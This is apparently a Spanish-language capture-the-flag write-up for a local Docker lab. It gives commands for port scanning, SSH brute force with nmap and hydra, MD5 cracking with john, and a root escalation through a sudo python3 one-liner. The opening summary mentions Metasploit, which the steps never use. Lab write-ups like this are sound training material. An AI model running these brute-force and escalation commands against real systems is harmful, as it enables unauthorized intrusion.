- Tags: #PequenasMentirosas
---
# Aprendizaje en Pequeñas-Mentirosas
El reto se centra en la explotación de una vulnerabilidad conocida en un servicio web, utilizando herramientas como Metasploit para obtener acceso inicial al sistema. Posteriormente, se realiza una escalada de privilegios mediante la identificación y explotación de configuraciones inseguras, lo que permite al atacante obtener acceso root.

[Maquina Pequenas Mentirosas](https://mega.nz/file/PBVmhbZR#4FmEtW_KULolSuinPFLs4pX2ukPnq8TjUDTEQk2bvsE) ==> Enlace de descarga al laboratorio
```bash
7z x pequenas-mentirosas.zip # Descomprimimos ek archivo
sudo bash auto_deploy.sh pequenas-mentirosas.tar # Desplegamos el laboratorio
```
---

#### Fase Reconocimiento:
```bash
172.17.0.2 --> Direccion ip del target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para ver si tenemos conectividad con el target.

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina Linux
172.17.0.2 (ttl -> 64): Linux
```

#### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts  # Realizamos escaneo para descubrir puertos expuestos en el target
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
 nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar los servicios y la version que corre detras de estos puertos.
```

**( 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) )** ==> Tenemos un servicio ssh expuesto
**( 80/tcp open  http    Apache httpd 2.4.62 ((Debian)) )** ==> Tenemos un servicio apache expuesto.
**( Apache httpd 2.4.62 )** ==> Revisando el **launchPad** podemos determinar que estamos ante una verson de **debianOracular**.

```bash
nmap --script http-enum -p80 172.17.0.2 # No reporta nada critico
```

#### Fase Recococimiento Web:
```bash
whatweb http://172.17.0.2 # No encontramos nada critico, Asi mismo la herramienta wappalyzer no nos reporta mucha informacion.
http://172.17.0.2 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2]
```
---
- **( a )** Tenemos un potencial usuario bajo este nombre, al cual aplicaremos fuerza bruta ya sea con **Hydra** o con **Nmap**
```bash
 nmap -p22 --script ssh-brute --script-args userdb=users.txt 172.17.0.2    # users.txt contiene el nombre.

a:secret - Valid credentials  # Tenemos credenciales validas
```

#### Fase Intrusion:
```bash
ssh-keygen -R 172.17.0.2 && ssh a@172.17.0.2 # despues ingresamos la password.
```

#### Fase Escalada Privilegios:
```bash
ls -l /home/ # Revisamos si existen mas usuarios,
cat /etc/passwd # 
```

**Nota** ==> Al listar el contenido del directorio, no encontramos ningún archivo. Es importante recordar que los archivos asociados con los servidores se almacenan en el directorio `/srv`.
**( /srv/ftp/ )** ==> Aqui se encuentrar archivos a los cuales le tendremos que aplicar fuerza bruta.

```bash
scp a@172.17.0.2:/srv/ftp/* . # Nos traemos todo a nuestro directorio actual de trabajo.
```
---
```bash
john --format=raw-md5 hash_spencer.txt # Rompemos el cifrado de este archivo y es: ( password1 )

hydra -l spencer -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://172.17.0.2 # Igual aplicamos fuerza bruta
[22][ssh] host: 172.17.0.2   login: spencer   password: password1 # Ahora podemos migrar al usaurio spencer
```

**( spencer )** ==> Desde la misma maquina comprometida nos logueamos con la **password** del este usuario
```bash
ssh spencer@localhost # password1

sudo -l # Detectamos que este usuario puede ejeucutar este binario python con privilegios sin proporcionar password.
User spencer may run the following commands on 24db61a61f61:
    (ALL) NOPASSWD: /usr/bin/python3
```

**Elevando Privilegios Root**
```bash
sudo -u root /usr/bin/python3 -c 'import os; os.system("/bin/bash -p")' # Ahora somos root y tenemos control total.
```